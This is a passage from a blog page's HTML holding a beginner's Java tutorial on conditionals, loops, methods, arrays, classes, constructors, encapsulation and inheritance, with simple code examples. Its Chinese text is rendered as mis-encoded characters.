åé¢æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œtrue or false ,åªæœ‰ä¸ºtrueæ‰ä¼šè¿”å›&#123;&#125;</span></span><br><span class="line">            System.out.println(<span class="string">&quot;è¿™ä¸ªæ•°å­—å¤§äº10&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ifåŒåˆ†æ”¯</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_31.png"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Gu0f3n.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTif02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//éœ€æ±‚æ˜¯å¦å¤§äº10</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span><span class="number">8</span>;</span><br><span class="line">        <span class="keyword">if</span>(num &gt;<span class="number">10</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;è¿™ä¸ªæ•°å­—å¤§äº10&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;è¿™ä¸ªæ•°å°äºç­‰äº10&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ifå¤šåˆ†æ”¯</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_32.png"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Gu0f3n.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTif03</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//åˆ¤æ–­å­¦ç”Ÿæˆç»©çš„ç­‰çº§</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">score</span> <span class="operator">=</span><span class="number">84</span>;<span class="comment">//ç»™å®šå­¦ç”Ÿä¸€ä¸ªç­‰çº§</span></span><br><span class="line"><span class="comment">//        if(score&gt;90)&#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(&quot;è¯¥å­¦ç”Ÿçš„ç­‰çº§ä¸ºA&quot;);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        if(score&gt;80 &amp;&amp; score&lt;90)&#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(&quot;è¯¥å­¦ç”Ÿçš„ç­‰çº§ä¸ºB&quot;);</span></span><br><span class="line"><span class="comment">//        &#125;if(score&gt;70 &amp;&amp; score&lt;80)&#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(&quot;è¯¥å­¦ç”Ÿçš„ç­‰çº§ä¸ºC&quot;);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="comment">//å¤šåˆ†æç»“æ„è§£å†³é—®é¢˜</span></span><br><span class="line">        <span class="keyword">if</span> (score &gt;= <span class="number">90</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;è¯¥å­¦ç”Ÿçš„ç­‰çº§ä¸ºA&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;è¯¥å­¦ç”Ÿçš„ç­‰çº§ä¸ºB&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">70</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;è¯¥å­¦ç”Ÿçš„ç­‰çº§ä¸ºC&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;è¯¥å­¦ç”Ÿçš„ç­‰çº§ä¸ºD&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">//å…œåº•</span></span><br><span class="line">            System.out.println(<span class="string">&quot;è¯¥å­¦ç”Ÿçš„ç­‰çº§ä¸ºE&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å¾ªç¯ç»“æ„"><a href="#å¾ªç¯ç»“æ„" class="headerlink" title="å¾ªç¯ç»“æ„"></a>å¾ªç¯ç»“æ„</h2><p> whileå¾ªç¯<img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_33.png" alt="img"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span><span class="number">1</span>;<span class="comment">//æ¡ä»¶åˆå§‹åŒ–</span></span><br><span class="line"><span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span><span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (num&lt;=<span class="number">5</span>) &#123;<span class="comment">//å¦‚æœè¡¨è¾¾å¼ç»“æœä¸ºtrueï¼Œé‚£ä¹ˆå°±å˜æˆæ­»å¾ªç¯//åˆ¤æ–­</span></span><br><span class="line">            sum = sum + num;<span class="comment">//å¾ªç¯ä½“</span></span><br><span class="line">            num++;<span class="comment">//è¿­ä»£</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>num&lt;&#x3D;5-&gt;true,sum:1ï¼Œnum:2-&gt;ç¬¬ä¸€æ¬¡å¾ªç¯ç»“æŸ<br>num&lt;&#x3D;5-&gt;true,sumï¼š3ï¼Œnumï¼š3-&gt;ç¬¬äºŒæ¬¡å¾ªç¯ç»“æŸ<br>num&lt;&#x3D;5-&gt;true,sumï¼š6ï¼Œnumï¼š4-&gt;ç¬¬ä¸‰æ¬¡å¾ªç¯ç»“æŸ<br>num&lt;&#x3D;5-&gt;true,sum:10,numï¼š5-&gt;ç¬¬å››æ¬¡å¾ªç¯ç»“æŸ<br>num&lt;&#x3D;5-&gt;true,sum:15;num:6-&gt;ç¬¬äº”æ¬¡å¾ªç¯ç»“æŸ<br>m&lt;&#x3D;5-&gt;false-&gt;å¾ªç¯åœæ­¢</p><p>forå¾ªç¯</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span><span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> num=<span class="number">1</span>;num&lt;=<span class="number">5</span>;num++) &#123;<span class="comment">//1.æ¡ä»¶åˆå§‹ï¼Œæ¡ä»¶åˆ¤æ–­ï¼Œè¿­ä»£</span></span><br><span class="line">    sum = sum + num;<span class="comment">//å¾ªç¯ä½“</span></span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;å’Œä¸º&quot;</span>+sum</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="æ–¹æ³•å’Œæ–¹æ³•é‡è½½"><a href="#æ–¹æ³•å’Œæ–¹æ³•é‡è½½" class="headerlink" title="æ–¹æ³•å’Œæ–¹æ³•é‡è½½"></a>æ–¹æ³•å’Œæ–¹æ³•é‡è½½</h2><p>æ–¹æ³•</p><p>å°±æ˜¯ä¸€æ®µç”¨æ¥å®Œæˆç‰¹å®šåŠŸèƒ½çš„ä»£ç ç‰‡æ®µ</p><p>ä¾‹å¦‚psvmï¼Œsout</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ–¹æ³•å£°æ˜æ ¼å¼</span><br><span class="line">ä¿®é¥°ç¬¦1ä¿®é¥°ç¬¦2]è¿”å›å€¼ç±»å‹æ–¹æ³•åï¼ˆå½¢å¼å¯¹è±¡å.æ–¹æ³•åï¼ˆå®å‚åˆ—è¡¨ï¼‰</span><br><span class="line">æ–¹æ³•è°ƒç”¨æ–¹å¼</span><br><span class="line">æ–¹æ³•åï¼ˆå®å‚åˆ—è¡¨ï¼‰ï¼ˆå‚æ•°åˆ—è¡¨ï¼‰</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test04;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTmethod</span> &#123;</span><br><span class="line">    <span class="comment">//æå–ä¸€ä¸ªæ–¹æ³•ï¼Œ å°†ä¸¤ä¸ªæ•°æ±‚å’Œ</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">addNum</span><span class="params">(<span class="type">int</span> num1 ,<span class="type">int</span> num2)</span>&#123;</span><br><span class="line">            <span class="comment">//æ±‚å’Œ</span></span><br><span class="line"></span><br><span class="line">             <span class="type">int</span> sum=num1+num2;</span><br><span class="line">             <span class="keyword">return</span> sum;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//10ï¼Œ20</span></span><br><span class="line">         <span class="type">int</span> a=addNum(<span class="number">10</span>,<span class="number">20</span>);</span><br><span class="line">        System.out.println(a);</span><br><span class="line">        <span class="comment">//30ï¼Œ20</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> addNum(<span class="number">30</span>,<span class="number">20</span>);</span><br><span class="line">        System.out.println(b);</span><br><span class="line">        <span class="comment">//40ï¼Œ8186</span></span><br><span class="line">         addNum(<span class="number">40</span>,<span class="number">8186</span>);</span><br><span class="line">        System.out.println(addNum(<span class="number">40</span>,<span class="number">8186</span>));</span><br><span class="line">        <span class="comment">//1.æ–¹æ³• æé«˜ä»£ç çš„å¤ç”¨æ€§ï¼Œå†™ä¸€æ¬¡ ç›´æ¥è°ƒç”¨å³å¯</span></span><br><span class="line">    &#125;   <span class="comment">//public static  æ–¹æ³•çš„ä¿®é¥°ç¬¦</span></span><br><span class="line">        <span class="comment">// int æ–¹æ³•çš„è¿”å›å€¼ç±»å‹   æ–¹æ³•è¿”å›å€¼å¯¹åº”çš„æ•°æ®ç±»å‹</span></span><br><span class="line">    <span class="comment">// addNum è§åçŸ¥æ„</span></span><br><span class="line">    <span class="comment">// num1 num2 å½¢å¼å‚æ•°åˆ—è¡¨ å½¢å‚</span></span><br><span class="line">    <span class="comment">//10 20  å®å‚</span></span><br><span class="line">    <span class="comment">//return sum; æ–¹æ³•çš„æœ€åæœ‰æ–¹æ³•çš„è¿”å›å€¼ï¼ˆå¯æœ‰ï¼‰å¦‚æœæ²¡æœ‰è¿”å›å€¼ æ–¹æ³•ç”³æ˜å‡º åŠ ä¸Švoid</span></span><br><span class="line">&#125;</span><br><span class="line">æ‰“å°ç»“æœï¼š</span><br><span class="line"><span class="number">30</span></span><br><span class="line"><span class="number">50</span></span><br><span class="line"><span class="number">8226</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ–¹æ³•çš„é‡è½½ï¼š</span><br><span class="line">åœ¨åŒä¸€ä¸ªç±»ä¸­ï¼Œæ–¹æ³•åç›¸åŒï¼Œå½¢å‚åˆ—è¡¨ä¸åŒçš„å¤šä¸ªæ–¹æ³•ï¼Œæ„æˆäº†æ–¹æ³•çš„é‡è½½ã€‚</span><br></pre></td></tr></table></figure><p>æ–¹æ³•åé‡å¤ ä½†å½¢å‚åˆ—è¡¨ä¸ä¸€æ ·&#x2F;&#x2F;æ–¹æ³• çš„é‡è½½åªå’Œå½¢å‚åˆ—è¡¨æœ‰å…³</p><h2 id="æ•°ç»„"><a href="#æ•°ç»„" class="headerlink" title="æ•°ç»„"></a>æ•°ç»„</h2><p>æ•°ç»„æ˜¯ç›¸åŒç±»å‹æ•°æ®çš„æœ‰åºé›†åˆã€‚å…¶ä¸­ï¼Œæ¯ä¸€ä¸ªæ•°æ®ç§°ä½œä¸€ä¸ªå…ƒç´ ï¼Œæ¯ä¸ªå…ƒç´ å¯ä»¥é€šè¿‡ä¸€ä¸ªç´¢å¼•ï¼ˆä¸‹æ ‡ï¼‰æ¥è®¿é—®å®ƒä»¬ã€‚</p><p>ç‰¹ç‚¹</p><p>1.é•¿åº¦æ˜¯ç¡®å®šçš„æ•°ç»„ä¸€æ—¦è¢«åˆ›å»ºå®ƒçš„å¤§å°å°±æ˜¯ä¸å¯ä»¥æ”¹å˜çš„ã€‚<br>2.å…¶å…ƒç´ çš„ç±»å‹å¿…é¡»æ˜¯ç›¸åŒç±»å‹ï¼Œä¸å…è®¸å‡ºç°æ··åˆç±»å‹<br>3.æ•°ç»„ç±»å‹å¯ä»¥æ˜¯ä»»ä½•æ•°æ®ç±»å‹ï¼Œï¼ŒåŒ…æ‹¬åŸºæœ¬ç±»å‹å’Œå¼•ç”¨ç±»å‹ã€‚<br>4.æ•°ç»„æœ‰ç´¢å¼•çš„ï¼šç´¢ç´¢å¼•lä»0å¼€å§‹ï¼Œåˆ°æ•°ç»„.length-1ç»“æŸ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test03;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTArray</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//æ•°ç»„å£°æ˜</span></span><br><span class="line">        <span class="type">int</span>[] ary;<span class="comment">//å®šä¹‰ä¸€ä¸ªæ•°ç»„</span></span><br><span class="line">        ary = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];<span class="comment">//ç»™å®šä¸€ä¸ªæ•°ç»„çš„é•¿åº¦10</span></span><br><span class="line">        <span class="comment">//int ary =new int[10];ä¸€å¥è¯ï¼Œé»˜è®¤é•¿åº¦çš„æ¯ä¸ªå…ƒç´ æœ‰é»˜è®¤çš„å€¼</span></span><br><span class="line">        <span class="comment">//æ•°ç»„çš„èµ‹å€¼ï¼›</span></span><br><span class="line">        ary[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        ary[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">        ary[<span class="number">2</span>] = <span class="number">31</span>;</span><br><span class="line">        ary[<span class="number">3</span>] = <span class="number">365</span>;</span><br><span class="line">        ary[<span class="number">4</span>] = <span class="number">456</span>;</span><br><span class="line">        <span class="comment">//æ•°ç»„çš„ä½¿ç”¨</span></span><br><span class="line">        System.out.println(ary[<span class="number">3</span>]);</span><br><span class="line">        System.out.println(ary[<span class="number">1</span>]+<span class="number">30</span>);</span><br><span class="line">        <span class="comment">//æ•°ç»„çš„éå†ï¼ˆæŸ¥çœ‹æ•°ç»„çš„æ¯ä¸€ä¸ªå…ƒç´ ï¼‰</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">0</span>;i &lt;=<span class="number">3</span>;i++)&#123;<span class="comment">//iä»£è¡¨å…ƒç´ çš„ç´¢å¼•</span></span><br><span class="line">            System.out.println(<span class="string">&quot;ç¬¬&quot;</span>+ i +<span class="string">&quot;ä¸ªå…ƒç´ &quot;</span>+ary[i]);</span><br><span class="line">            System.out.println(<span class="string">&quot;å¢å¼ºçš„forå¾ªç¯&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> num:ary)&#123;</span><br><span class="line">    System.out.println(num);</span><br><span class="line">&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="é¢å‘å¯¹è±¡-â€”ç±»å’Œå¯¹è±¡"><a href="#é¢å‘å¯¹è±¡-â€”ç±»å’Œå¯¹è±¡" class="headerlink" title="é¢å‘å¯¹è±¡ â€”ç±»å’Œå¯¹è±¡"></a>é¢å‘å¯¹è±¡ â€”ç±»å’Œå¯¹è±¡</h2><p>ç±»ï¼šå¯¹å¯¹è±¡å‘ä¸ŠæŠ½å–å‡ºåƒçš„éƒ¨åˆ†ã€å…¬å…±çš„éƒ¨åˆ†ä»¥æ­¤å½¢æˆç±»ï¼Œç±»å°±ç›¸å½“äºä¸€ä¸ªæ¨¡ç‰ˆã€‚<br>å¯¹è±¡ï¼šæ¨¡ç‰ˆä¸‹å…·ä½“çš„äº§ç‰©å¯ä»¥ç†è§£ä¸ºå…·ä½“å¯¹è±¡ï¼Œå¯¹è±¡å°±æ˜¯ä¸€ä¸ªä¸€ä¸ªå…·ä½“çš„å®ä¾‹ï¼Œå°±<br>ç›¸å½“äºè¿™ä¸ªæ¨¡ç‰ˆä¸‹å…·ä½“çš„äº§å“ã€‚<br>Javaä¸­å…ˆå®šä¹‰ç±»ï¼Œå†åˆ›å»ºå¯¹è±¡ã€‚</p><p>ç±»çš„ç¼–å†™<br>1.ç»™ç±»èµ·ä¸€ä¸ªè§åçŸ¥æ„çš„åå­—ï¼Œé¦–å­—æ¯å¤§å†™ï¼Œé©¼å³°å‘½ååŸåˆ™ã€‚<br>2.ç±»çš„ç‰¹æ€§ç¼–å†™ï¼Œç‰¹æ€§å³ç±»çš„å±æ€§éƒ¨åˆ†ã€‚<br>3.ç±»çš„è¡Œä¸ºç¼–å†™ï¼Œè¡Œä¸ºå³ç±»çš„æ–¹æ³•éƒ¨åˆ†ã€‚<br>å¯¹è±¡çš„åˆ›å»ºå’Œä½¿ç”¨<br>åˆ›å»ºæ ¼å¼ï¼šç±»åå¯¹è±¡å&#x3D;newç±»å();<br>ç»™å¯¹è±¡çš„å±æ€§èµ‹å€¼ï¼šå¯¹è±¡å.å±æ€§å&#x3D;å€¼ï¼›<br>è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•ï¼š[è¿”å›å€¼ç±»å‹åå­—&#x3D;]å¯¹è±¡å.æ–¹æ³•å(å‚æ•°åˆ—è¡¨);</p><p>å¯¹è±¡çš„åˆ›å»º</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test05;</span><br><span class="line"><span class="comment">//äººç±»</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">person</span> &#123;</span><br><span class="line">    <span class="comment">//ç‰¹æ€§ç¼–å†™ å±æ€§ï¼ˆæŒ‡å®šä¹‰ä¸ä¸šåŠ¡é€»è¾‘ç›¸å…³çš„ä»£ç ï¼‰</span></span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="type">double</span> height;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//è¡Œä¸º æ–¹æ³•</span></span><br><span class="line">    <span class="comment">//å®šä¹‰ä¸€ä¸ªå­¦ä¹ çš„æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">study</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ä¼å…µä¸€å·å¢æœ¬ä¼Ÿå‡†å¤‡å°±ç»ª&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ä½¿ç”¨</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> test05;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//ç¨‹åºå…¥å£</span></span><br><span class="line">        <span class="comment">//å¯¹æˆ‘ä»¬çš„personç±»è¿›è¡Œåˆ›å»º</span></span><br><span class="line">        <span class="type">person</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">person</span>();<span class="comment">//å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line">        p1.name = <span class="string">&quot;Gu0f3n&quot;</span>;</span><br><span class="line">        p1.age = <span class="number">20</span>;</span><br><span class="line">        p1.height=<span class="number">181.99</span>;</span><br><span class="line">        System.out.println(p1.age);</span><br><span class="line">        System.out.println(p1.height);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ„é€ å™¨"><a href="#æ„é€ å™¨" class="headerlink" title="æ„é€ å™¨"></a>æ„é€ å™¨</h2><p>ä½œç”¨</p><p>å¯¹äºä¸€ä¸ªç±»æ¥è¯´ï¼Œä¸€èˆ¬æœ‰ä¸‰ç§å¸¸è§çš„æˆå‘˜ï¼š<strong>å±æ€§ã€æ–¹æ³•ã€æ„é€ å™¨ã€‚</strong><br>è¿™ä¸‰ç§æˆå‘˜éƒ½å¯ä»¥å®šä¹‰é›¶ä¸ªæˆ–å¤šä¸ªã€‚<br><strong>æ„é€ æ–¹æ³•</strong>ä¹Ÿå«æ„é€ å™¨ï¼Œæ˜¯ä¸€ä¸ªåˆ›å»ºå¯¹è±¡æ—¶è¢«<strong>è‡ªåŠ¨è°ƒç”¨</strong>çš„ç‰¹æ®Šæ–¹æ³•ï¼Œç”¨äºå¯¹è±¡çš„<strong>åˆå§‹åŒ–ã€‚</strong><br>Javaé€šè¿‡newå…³é”®å­—æ¥è°ƒç”¨æ„é€ å™¨ï¼Œä»è€Œè¿”å›è¯¥ç±»çš„å®ä¾‹ã€‚</p><p>æ„é€ å™¨å£°æ˜ç±»å‹</p><p>å£°æ˜æ ¼å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[ä¿®é¥°ç¬¦]ç±»åï¼ˆå½¢å‚åˆ—è¡¨ï¼‰</span><br><span class="line">//næ¡è¯­å¥</span><br></pre></td></tr></table></figure><p>è‹¥æ— å‚æ•°åˆ—è¡¨ï¼Œç§°ä¹‹ä¸ºæ— å‚æ„é€ å™¨ï¼ˆç©ºæ„é€ å™¨ï¼‰<br>è‹¥æœ‰å‚æ•°åˆ—è¡¨ï¼Œç§°ä¹‹ä¸ºæœ‰å‚æ„é€ å™¨</p><h2 id="å°è£…"><a href="#å°è£…" class="headerlink" title="å°è£…"></a>å°è£…</h2><p>æˆ‘ä»¬ç¨‹åºè®¾è®¡è¿½æ±‚â€œé«˜å†…èšï¼Œä½è€¦åˆâ€ã€‚</p><blockquote><p>é«˜å†…èšï¼šç±»çš„å†…éƒ¨æ•°æ®æ“ä½œç»†èŠ‚è‡ªå·±å®Œæˆï¼Œä¸å…è®¸å¤–éƒ¨å¹²æ¶‰ï¼›<br>ä½è€¦åˆï¼šä»…å¯¹å¤–æš´éœ²å°‘é‡çš„æ–¹æ³•ç”¨äºä½¿ç”¨ã€‚<br>éšè—å¯¹è±¡å†…éƒ¨çš„å¤æ‚æ€§ï¼Œåªå¯¹å¤–å…¬å¼€ç®€å•çš„æ¥å£ã€‚ä¾¿äºå¤–ç•Œè°ƒç”¨ï¼Œä»è€Œæé«˜ç³»<br>ç»Ÿçš„å¯æ‰©å±•æ€§ã€å¯ç»´æŠ¤æ€§ï¼Œæé«˜ç¨‹åºçš„å®‰å…¨æ€§ã€‚é€šä¿—çš„è¯´ï¼ŒæŠŠè¯¥éšè—çš„éšè—èµ·<br>æ¥ï¼Œè¯¥æš´éœ²çš„æš´éœ²å‡ºæ¥ã€‚è¿™å°±æ˜¯å°è£…æ€§çš„è®¾è®¡æ€æƒ³ã€‚</p></blockquote><h2 id="ç»§æ‰¿"><a href="#ç»§æ‰¿" class="headerlink" title="ç»§æ‰¿"></a>ç»§æ‰¿</h2><p><strong>ç±»æ˜¯å¯¹å¯¹è±¡çš„æŠ½è±¡</strong></p><p><strong>ç»§æ‰¿æ˜¯å¯¹ç±»çš„æŠ½è±¡</strong></p><p>éšä¾¿å†™ç‚¹ä»£ç ç»ƒä¹ ä¸€ä¸‹</p><p>çˆ¶ç±»person</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Gu0f3n.java.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">person</span> &#123;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="type">double</span> height;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getHeight</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> height;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHeight</span><span class="params">(<span class="type">double</span> height)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.height = height;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//åƒé¥­</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;eat&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//ç¡è§‰</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;sleep&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//æ‰“è±†è±†</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dadoudou</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ‰“è±†è±†å“¦&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Gu0f3n.java.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">students</span> <span class="keyword">extends</span> <span class="title class_">person</span>&#123;<span class="comment">//å­ç±»ç»§æ‰¿è‡ªçˆ¶ç±»</span></span><br><span class="line">    <span class="comment">//å®šä¹‰å­ç±»è‡ªå·±çš„å±æ€§å’Œæ–¹æ³•</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> sno;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSno</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> sno;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSno</span><span class="params">(<span class="type">int</span> sno)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.sno = sno;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">study</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;study&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Gu0f3n.java.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">students</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">students</span>();</span><br><span class="line">        s.setSno(<span class="number">24710245</span>);</span><br><span class="line">        s.age=<span class="number">18</span>;</span><br><span class="line">        s.height=<span class="number">181.6</span>;</span><br><span class="line">        s.name=<span class="string">&quot;xiaobia&quot;</span>;</span><br><span class="line">        s.eat();</span><br><span class="line">        s.study();</span><br><span class="line">        s.dadoudou();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å‘ç°å…·ä½“çš„ç±»æˆ‘å¯ä»¥éšæ„è°ƒç”¨</span></span><br><span class="line">#eat</span><br><span class="line">#study</span><br><span class="line">#æ‰“è±†è±†å“¦</span><br><span 